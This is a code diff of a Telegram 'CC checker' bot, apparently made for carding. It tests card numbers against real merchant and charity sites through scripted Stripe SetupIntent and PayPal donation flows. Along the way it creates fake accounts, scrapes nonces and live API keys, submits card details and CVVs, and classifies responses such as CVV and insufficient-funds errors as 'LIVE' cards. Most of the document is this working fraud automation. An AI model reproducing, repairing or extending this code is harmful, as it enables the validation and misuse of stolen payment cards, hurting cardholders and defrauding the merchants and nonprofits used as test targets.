@@ -1,3 +1,14 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Obeida Online - Real Multi Gateway CC Checker Bot
+Version: 14.0 - Final All Gateways Matched Original Code
+Author: @ObeidaOnline
+Channel: https://t.me/ObeidaTrading
+"""
+
+# ==================== التحقق من إصدار Python ====================
 import sys
 import platform
 
@@ -415,22 +426,16 @@ class DataManager:
                 "usage": {"total_checks": 0, "approved": 0, "declined": 0}
             }
         
-        # تحسين الكشف عن البطاقات المقبولة
         is_approved = any(x in result for x in [
             "✅", "LIVE", "Approved", "approved", "UwU", "CHARGED",
             "CVV ERROR", "INSUFFICIENT", "RISK CARD", "CVV2_FAILURE",
             "INVALID_SECURITY_CODE", "AVS FAILED"
         ])
         
-        is_live = any(x in result for x in [
-            "LIVE", "CVV ERROR", "INSUFFICIENT FUNDS", "RISK CARD",
-            "CVV2_FAILURE", "INVALID_SECURITY_CODE", "AVS FAILED"
-        ])
-        
         usage = users[uid].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
         usage["total_checks"] += 1
         
-        if is_approved or is_live:
+        if is_approved:
             usage["approved"] += 1
             stats["total_approved"] = stats.get("total_approved", 0) + 1
         else:
@@ -446,7 +451,7 @@ class DataManager:
         if today not in stats["daily_stats"]:
             stats["daily_stats"][today] = {"checks": 0, "approved": 0}
         stats["daily_stats"][today]["checks"] += 1
-        if is_approved or is_live:
+        if is_approved:
             stats["daily_stats"][today]["approved"] += 1
         
         DataManager.save_users(users)
@@ -717,7 +722,7 @@ class ResultFormatter:
 
 # ==================== بوابة Stripe 1 (مطابقة للكود الأصلي) ====================
 class StripeGateway1:
-    """Stripe Gateway 1 - SetupIntent Auth - مطابق للكود الأصلي"""
+    """Stripe Gateway 1 - SetupIntent Auth"""
     
     @staticmethod
     def normalize_url(url):
@@ -897,13 +902,12 @@ class StripeGateway1:
                         text = await res.text()
                         if 'success' in text:
                             js = json.loads(text)
-                            branding = f" [Verified]"
                             if js.get('success'):
                                 status = js.get('data', {}).get('status')
-                                return True, f"✅ Approved (Status: {status}){branding}"
+                                return True, f"✅ Approved (Status: {status})"
                             else:
                                 error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
-                                return False, f"❌ {error_msg}{branding}"
+                                return False, f"❌ {error_msg}"
                     except:
                         continue
                 
@@ -912,147 +916,12 @@ class StripeGateway1:
         except Exception as e:
             return False, f"⚠️ System Error: {str(e)[:50]}"
 
-# ==================== بوابة Stripe 2 (مطابقة للكود الأصلي) ====================
-class StripeGateway2:
-    """Stripe Gateway 2 - Alternative Auth Method - مطابق للكود الأصلي"""
-    
-    @staticmethod
-    def generate_random_email():
-        username = ''.join(random.choices(string.ascii_lowercase, k=10))
-        return f"{username}@gmail.com"
-    
-    @staticmethod
-    def generate_random_password(length: int = 12):
-        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
-        return ''.join(random.choices(characters, k=length))
+# ==================== بوابة Stripe 2 (مطابقة لـ Stripe v1) ====================
+class StripeGateway2(StripeGateway1):
+    """Stripe Gateway 2 - نفس طريقة Stripe v1"""
     
     async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
-        try:
-            site_url = "https://copenhagensilver.com"
-            
-            async with aiohttp.ClientSession() as session:
-                headers = {
-                    'referer': f'{site_url}/my-account/',
-                    'accept': 'text/html,application/xhtml+xml',
-                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
-                }
-                
-                resp = await session.get(f"{site_url}/my-account/", headers=headers)
-                html = await resp.text()
-                
-                register_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
-                if not register_match:
-                    return False, "❌ Failed to extract register nonce"
-                
-                register_nonce = register_match.group(1)
-                email = self.generate_random_email()
-                password = self.generate_random_password()
-                
-                headers['content-type'] = 'application/x-www-form-urlencoded'
-                register_data = {
-                    'email': email,
-                    'password': password,
-                    'woocommerce-register-nonce': register_nonce,
-                    '_wp_http_referer': '/my-account/',
-                    'register': 'Register'
-                }
-                
-                await session.post(f"{site_url}/my-account/", headers=headers, data=register_data)
-                
-                resp = await session.get(f"{site_url}/my-account/add-payment-method/", headers=headers)
-                data = await resp.text()
-                
-                nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', data)
-                stripe_pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', data)
-                
-                if not nonce_match or not stripe_pk_match:
-                    return False, "❌ SetupIntent nonce not found"
-                
-                nonce = nonce_match.group(1)
-                pk = stripe_pk_match.group(0)
-                
-                stripe_headers = {
-                    'authority': 'api.stripe.com',
-                    'accept': 'application/json',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': 'https://js.stripe.com',
-                    'referer': 'https://js.stripe.com/',
-                    'user-agent': headers['user-agent']
-                }
-                
-                stripe_data = {
-                    "type": "card",
-                    "card[number]": card_data['number'],
-                    "card[cvc]": card_data['cvv'],
-                    "card[exp_year]": card_data['year'][-2:],
-                    "card[exp_month]": card_data['month'],
-                    "allow_redisplay": "unspecified",
-                    "billing_details[address][country]": "EG",
-                    "payment_user_agent": "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent",
-                    "referrer": site_url,
-                    "time_on_page": str(random.randint(10000, 99999)),
-                    "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
-                    "client_attribution_metadata[merchant_integration_source]": "elements",
-                    "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
-                    "client_attribution_metadata[merchant_integration_version]": "2021",
-                    "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
-                    "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
-                    "client_attribution_metadata[elements_session_config_id]": str(uuid.uuid4()),
-                    "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
-                    "guid": str(uuid.uuid4()),
-                    "muid": str(uuid.uuid4()),
-                    "sid": str(uuid.uuid4()),
-                    "key": pk,
-                    "_stripe_version": "2024-06-20"
-                }
-                
-                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
-                pm_json = await pm_resp.json()
-                
-                token = pm_json.get("id")
-                if not token:
-                    error = pm_json.get('error', {})
-                    msg = error.get('message', 'Invalid card')
-                    if 'cvv' in msg.lower():
-                        return True, "💳 CCN LIVE - CVV ERROR"
-                    if 'insufficient' in msg.lower():
-                        return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
-                    return False, f"❌ {msg}"
-                
-                confirm_headers = {
-                    'accept': '*/*',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': site_url,
-                    'referer': f"{site_url}/my-account/add-payment-method/",
-                    'user-agent': headers['user-agent'],
-                    'x-requested-with': 'XMLHttpRequest',
-                }
-                
-                confirm_data = {
-                    'action': 'wc_stripe_create_and_confirm_setup_intent',
-                    'wc-stripe-payment-method': token,
-                    'wc-stripe-payment-type': 'card',
-                    '_ajax_nonce': nonce,
-                }
-                
-                confirm_resp = await session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=confirm_headers, data=confirm_data)
-                
-                try:
-                    result = await confirm_resp.json()
-                    if result.get('success', False):
-                        return True, "✅ Card Approved UwU"
-                    else:
-                        error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
-                        if 'cvv' in error_msg.lower():
-                            return True, "💳 CCN LIVE - CVV ERROR"
-                        if 'insufficient' in error_msg.lower():
-                            return True, "💰 CCN LIVE - INSUFFICIENT FUNDS"
-                        return False, f"❌ {error_msg}"
-                except:
-                    return False, "❌ Unexpected response"
-                    
-        except Exception as e:
-            return False, f"⚠️ Error: {str(e)[:50]}"
+        return await super().process_card("https://copenhagensilver.com", card_data)
 
 # ==================== بوابة PayPal (مطابقة للكود الأصلي) ====================
 class PayPalGateway:
@@ -1133,7 +1002,8 @@ class PayPalGateway:
                 "X-Requested-With": "XMLHttpRequest"
             }
             
-            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua_str}, timeout=20)
+            # 1. Scrape tokens
+            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua_str}, timeout=30)
             html = r.text
             
             hash_match = re.search(r'name="give-form-hash" value="(.*?)"', html)
@@ -1154,6 +1024,7 @@ class PayPalGateway:
                 'id': id_match.group(1)
             }
             
+            # 2. Register donation
             data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": tokens['pfx'],
@@ -1175,10 +1046,11 @@ class PayPalGateway:
                 "give_ajax": "true"
             }
             
-            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=ajax_headers, data=data, timeout=20)
+            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=ajax_headers, data=data, timeout=30)
             if r.status_code != 200:
                 return False, "❌ Donation registration failed"
             
+            # 3. Create order
             data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": tokens['pfx'],
@@ -1191,14 +1063,19 @@ class PayPalGateway:
             
             r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
                             params={"action": "give_paypal_commerce_create_order"},
-                            headers=ajax_headers, data=data, timeout=20)
-            order_data = r.json()
+                            headers=ajax_headers, data=data, timeout=30)
+            
+            try:
+                order_data = r.json()
+            except:
+                return False, "❌ Invalid JSON response"
             
             if not order_data.get("success") or not order_data.get("data", {}).get("id"):
                 return False, "❌ PayPal order creation failed"
             
             order_id = order_data["data"]["id"]
             
+            # 4. Charge card
             addr = donor["address"]
             full_yy = card_data['year'] if len(card_data['year']) == 4 else "20" + card_data['year']
             
@@ -1300,6 +1177,7 @@ class PayPalGateway:
             )
             paypal_text = r.text
             
+            # 5. Approve order
             data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": tokens['pfx'],
@@ -1317,6 +1195,7 @@ class PayPalGateway:
             )
             approve_text = r.text
             
+            # 6. تحليل النتيجة
             t = paypal_text.upper() if paypal_text else ""
             
             # نتائج CHARGED
@@ -1327,7 +1206,7 @@ class PayPalGateway:
             if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
                 return True, "CHARGED!"
             
-            # نتائج LIVE (CVV, AVS, Insufficient)
+            # نتائج LIVE
             if 'CVV2_FAILURE' in t:
                 return True, "CVV2 FAILURE (Card is LIVE)"
             if 'INVALID_SECURITY_CODE' in t:
@@ -1342,29 +1221,10 @@ class PayPalGateway:
             declines = [
                 ('DO_NOT_HONOR', 'Do Not Honor'),
                 ('ACCOUNT_CLOSED', 'Account Closed'),
-                ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'Account Locked/Closed'),
                 ('LOST_OR_STOLEN', 'LOST OR STOLEN'),
                 ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
                 ('INVALID_ACCOUNT', 'INVALID ACCOUNT'),
-                ('REATTEMPT_NOT_PERMITTED', 'REATTEMPT NOT PERMITTED'),
-                ('ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT BLOCKED BY ISSUER'),
-                ('ORDER_NOT_APPROVED', 'ORDER NOT APPROVED'),
-                ('PICKUP_CARD_SPECIAL_CONDITIONS', 'PICKUP CARD'),
-                ('PAYER_CANNOT_PAY', 'PAYER CANNOT PAY'),
-                ('GENERIC_DECLINE', 'GENERIC DECLINE'),
-                ('COMPLIANCE_VIOLATION', 'COMPLIANCE VIOLATION'),
-                ('TRANSACTION_NOT_PERMITTED', 'TRANSACTION NOT PERMITTED'),
-                ('PAYMENT_DENIED', 'PAYMENT DENIED'),
-                ('INVALID_TRANSACTION', 'INVALID TRANSACTION'),
-                ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED/INACTIVE ACCOUNT'),
-                ('SECURITY_VIOLATION', 'SECURITY VIOLATION'),
-                ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED - UPDATED ACCOUNT'),
-                ('INVALID_OR_RESTRICTED_CARD', 'INVALID/RESTRICTED CARD'),
                 ('EXPIRED_CARD', 'EXPIRED CARD'),
-                ('CRYPTOGRAPHIC_FAILURE', 'CRYPTOGRAPHIC FAILURE'),
-                ('TRANSACTION_CANNOT_BE_COMPLETED', 'CANNOT BE COMPLETED'),
-                ('DECLINED_PLEASE_RETRY', 'DECLINED - RETRY LATER'),
-                ('TX_ATTEMPTS_EXCEED_LIMIT', 'TX ATTEMPTS EXCEED LIMIT'),
             ]
             
             for keyword, msg in declines:
@@ -1375,13 +1235,6 @@ class PayPalGateway:
                 rj = json.loads(paypal_text)
                 if "errors" in rj:
                     return False, rj["errors"][0].get("message", "Unknown")
-            except:
-                pass
-            
-            try:
-                rj = json.loads(approve_text)
-                if rj.get("data", {}).get("error"):
-                    return False, str(rj["data"]["error"])
             except:
                 pass
             
@@ -1772,15 +1625,13 @@ class CommandHandler:
             bot.answer_callback_query(call.id, "❌ فشل في تعيين البوابة")
     
     def check_single_card(self, message, card: Dict, gate: str):
-    """فحص بطاقة واحدة مع شريط تقدم متحرك"""
-    user_id = message.from_user.id
-    gate_name = GATES[gate]['name']
-    masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
-    
-    # إرسال رسالة البداية
-    progress_msg = bot.reply_to(
-        message,
-        f"""
+        user_id = message.from_user.id
+        gate_name = GATES[gate]['name']
+        masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
+        
+        progress_msg = bot.reply_to(
+            message,
+            f"""
 🚀  جاري الفحص 🚀
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
@@ -1789,28 +1640,25 @@ class CommandHandler:
 𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق ◐
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 """,
-        parse_mode='HTML'
-    )
-    
-    # حفظ معرف الرسالة
-    message_id = progress_msg.message_id
-    chat_id = progress_msg.chat.id
-    
-    # متغير للتحكم في الأنيميشن
-    stop_animation = threading.Event()
-    
-    def animate_progress():
-        """تشغيل أنيميشن شريط التقدم"""
-        frame = 0
-        while not stop_animation.is_set():
-            try:
-                loading = ResultFormatter.get_loading_animation(frame)
-                percentage = min(frame * 2, 95)
-                bar_length = 20
-                filled = int((percentage / 100) * bar_length)
-                bar = "█" * filled + "░" * (bar_length - filled)
-                
-                text = f"""
+            parse_mode='HTML'
+        )
+        
+        message_id = progress_msg.message_id
+        chat_id = progress_msg.chat.id
+        
+        stop_animation = threading.Event()
+        
+        def animate_progress():
+            frame = 0
+            while not stop_animation.is_set():
+                try:
+                    loading = ResultFormatter.get_loading_animation(frame)
+                    percentage = min(frame * 2, 95)
+                    bar_length = 20
+                    filled = int((percentage / 100) * bar_length)
+                    bar = "█" * filled + "░" * (bar_length - filled)
+                    
+                    text = f"""
 🚀  جاري الفحص 🚀
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
@@ -1819,51 +1667,36 @@ class CommandHandler:
 𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق {loading}
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 """
-                bot.edit_message_text(text, chat_id, message_id, parse_mode='HTML')
-                frame += 1
-                time.sleep(0.3)
-            except Exception as e:
-                print(f"Animation error: {e}")
-                break
-    
-    # بدء الأنيميشن
-    animation_thread = threading.Thread(target=animate_progress)
-    animation_thread.start()
-    
-    try:
-        # فحص البطاقة
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
-        loop.close()
+                    bot.edit_message_text(text, chat_id, message_id, parse_mode='HTML')
+                    frame += 1
+                    time.sleep(0.3)
+                except:
+                    break
         
-        # إيقاف الأنيميشن
-        stop_animation.set()
-        animation_thread.join(timeout=1)
+        animation_thread = threading.Thread(target=animate_progress)
+        animation_thread.start()
         
-        # تحديث الإحصائيات
-        DataManager.update_usage(message.from_user.id, gate, resp)
-        DataManager.save_card_result(card['original'], gate_name, resp, message.from_user.id, approved)
-        
-        # الحصول على معلومات BIN
-        bin_info = Helpers.get_bin_info(card['number'][:6])
-        
-        # تنسيق النتيجة النهائية
-        final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
-        
-        # تحديث الرسالة بالنتيجة النهائية
-        bot.edit_message_text(final_result, chat_id, message_id, parse_mode='HTML')
-        
-    except Exception as e:
-        # إيقاف الأنيميشن في حالة الخطأ
-        stop_animation.set()
-        animation_thread.join(timeout=1)
-        bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", chat_id, message_id, parse_mode='HTML')
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
+            loop.close()
+            
+            stop_animation.set()
+            animation_thread.join(timeout=1)
+            
+            DataManager.update_usage(message.from_user.id, gate, resp)
+            DataManager.save_card_result(card['original'], gate_name, resp, message.from_user.id, approved)
+            
+            bin_info = Helpers.get_bin_info(card['number'][:6])
+            final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
+            
+            bot.edit_message_text(final_result, chat_id, message_id, parse_mode='HTML')
             
         except Exception as e:
             stop_animation.set()
             animation_thread.join(timeout=1)
-            bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", progress_msg.chat.id, progress_msg.message_id)
+            bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", chat_id, message_id, parse_mode='HTML')
     
     def check_multiple_cards(self, message, cards: List[Dict], gate: str):
         user_id = message.from_user.id
